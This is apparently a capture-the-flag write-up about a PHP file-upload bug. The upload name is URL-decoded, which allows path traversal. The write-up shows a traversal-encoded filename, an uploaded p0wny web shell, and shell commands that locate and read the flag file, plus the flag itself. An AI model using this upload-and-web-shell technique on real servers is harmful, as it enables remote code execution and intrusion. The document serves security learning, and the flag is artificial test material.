# WRITEUP

See this.

```php
if(isset($_FILES["file"])) {
        $error = '';
        $success = '';
        try {
            $file = $dir . "/" . urldecode($_FILES["file"]["name"]);
            move_uploaded_file($_FILES["file"]["tmp_name"], $file);
            $success = 'Successfully uploaded file at: ' . $file;
        } catch(Exception $e) {
            $error = $e->getMessage();
        }
    }
```

See this `urldecode($_FILES["file"]["name"])`<br>
urldecode ❓❓

Go submit simple file .php : `<?php echo("pwn");?>` <br>
Add %2e%2e%2f%2e%2e%2f to head of file name. Like: %2e%2e%2f%2e%2e%2fshell.php. <br>
See, it's pwned.

Go submit file shell.php (from [p0wny@shell](https://github.com/flozz/p0wny-shell)).

```
p0wny@shell:…/www/html# find / -name flag.txt 2> /dev/null
...
/flag.txt

p0wny@shell:…/www/html# cat /flag.txt
CTF{f1Le_uPl0aD_plUs_p@th_trAv3rsal}
```

> CTF{f1Le_uPl0aD_plUs_p@th_trAv3rsal}

